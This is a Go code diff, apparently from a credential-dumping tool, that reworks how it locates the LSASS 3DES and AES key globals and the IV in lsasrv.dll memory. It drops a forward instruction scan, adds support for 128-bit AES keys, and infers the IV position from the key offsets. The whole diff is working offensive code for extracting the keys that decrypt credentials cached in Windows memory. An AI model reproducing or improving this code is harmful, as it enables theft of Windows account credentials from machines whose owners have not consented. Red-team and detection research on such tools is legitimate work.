@@ -210,29 +210,6 @@ type cryptoScanCandidate struct {
 func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, reader lsassReader) (lsaCryptoGlobals, error) {
 	bufLen := len(lsasrvBytes)
 
-	// Scan forward from the pattern for the IV LEA instruction.
-	var ivOff int
-	ivFound := false
-	fwdStart := hit + patLen - 7
-	if fwdStart < hit {
-		fwdStart = hit
-	}
-	for off := fwdStart; off < hit+50 && off+7 <= bufLen; off++ {
-		if !isRIPRelativeMOVorLEA(lsasrvBytes, off) {
-			continue
-		}
-		target, _, ok := resolveRIPRelative(lsasrvBytes, off, 3, 7)
-		if !ok || target < 0 || target >= bufLen {
-			continue
-		}
-		ivOff = target
-		ivFound = true
-		break
-	}
-	if !ivFound {
-		return lsaCryptoGlobals{}, fmt.Errorf("no RIP-relative LEA/MOV found within 50 bytes after pattern at offset %d", hit)
-	}
-
 	// Scan both backward AND forward from the pattern for RIP-relative
 	// MOV/LEA instructions whose targets are global variables containing
 	// BCrypt handle pointers. The globals are in lsasrv.dll's .data section,
@@ -427,13 +404,26 @@ func scanCryptoGlobals(lsasrvBytes []byte, lsasrvBase uintptr, hit, patLen int, 
 			len(keyGlobals), hit, formatValidatedKeys(keyGlobals, lsasrvBase), rejStr, hexDump, hexPost)
 	}
 
-	// Order by key size: 3DES (bits=168, 24 bytes) first, AES (bits=256, 32 bytes) second.
-	// If bits info unavailable, keep discovery order (backward scan finds closest first).
+	// Order by key size: 3DES (bits=168, 24 bytes) first, AES (bits=256/128) second.
 	desIdx, aesIdx := 0, 1
 	if len(keyGlobals) >= 2 {
 		if keyGlobals[0].bits == 256 && keyGlobals[1].bits == 168 {
 			desIdx, aesIdx = 1, 0
+		} else if keyGlobals[0].bits == 128 && keyGlobals[1].bits == 168 {
+			desIdx, aesIdx = 1, 0
 		}
+	}
+
+	// Derive IV location: in the standard BCrypt layout, the IV is stored
+	// immediately before the first key global (16 bytes of random data).
+	// Sort key offsets to find the lowest, then IV = lowest - 16.
+	minKeyOff := keyGlobals[desIdx].targetOff
+	if keyGlobals[aesIdx].targetOff < minKeyOff {
+		minKeyOff = keyGlobals[aesIdx].targetOff
+	}
+	ivOff := minKeyOff - 16
+	if ivOff < 0 {
+		ivOff = 0
 	}
 
 	return lsaCryptoGlobals{
